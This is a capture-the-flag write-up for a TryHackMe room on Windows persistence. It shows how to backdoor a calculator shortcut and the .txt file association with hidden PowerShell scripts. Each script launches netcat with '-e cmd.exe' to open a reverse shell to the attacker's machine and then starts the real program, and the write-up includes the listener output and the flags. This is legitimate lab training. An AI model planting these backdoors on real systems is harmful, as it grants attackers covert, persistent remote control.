# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/05/2023

# Shortcut Files
1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

3. `PowerShell` from the compromised Windows machine to
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
4. `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
5. `$scriptContent = @"`
6. `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
7. `C:\Windows\System32\calc.exe`
8. `"@` 
9. `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.210.65 9999"
>> C:\Windows\System32\calc.exe
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
>>
```
5. Change the calculator's icon and shortcut properties to 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1'

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20Properties%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

6. `nc -lvnp <PORT NUMBER>`  from our Linux attack machine to
```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
7. Click on the calculator

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Backdoor%20Script%20Executed%20.png)

```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.105.224 49982 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
8. `C:\flags\flag5.exe` from our reverse shell to run the **flag54.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}
```


**TASK COMPLETED**

# Hijacking File Associations
1. Started this room's machine
2. `regedit`
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)

3. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
4. `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
5. `$scriptContent = @"`
6. `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
7. `C:\Windows\system32\NOTEPAD.EXE $args[0]`
8. `"@` 
9. `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.173.81 9999"
>> C:\Windows\system32\NOTEPAD.EXE $args[0]
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
PS C:\Users\Administrator>
```
10. Change value data to `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Default%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)

11. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to
```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

12. Open any text file

![]()

```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.141.70 49905 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>
```
13. `C:\flags\flag6.exe` from our reverse shell to run the **flag6.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Users\Administrator\Desktop>C:\flags\flag6.exe
C:\flags\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```


**TASK COMPLETED**
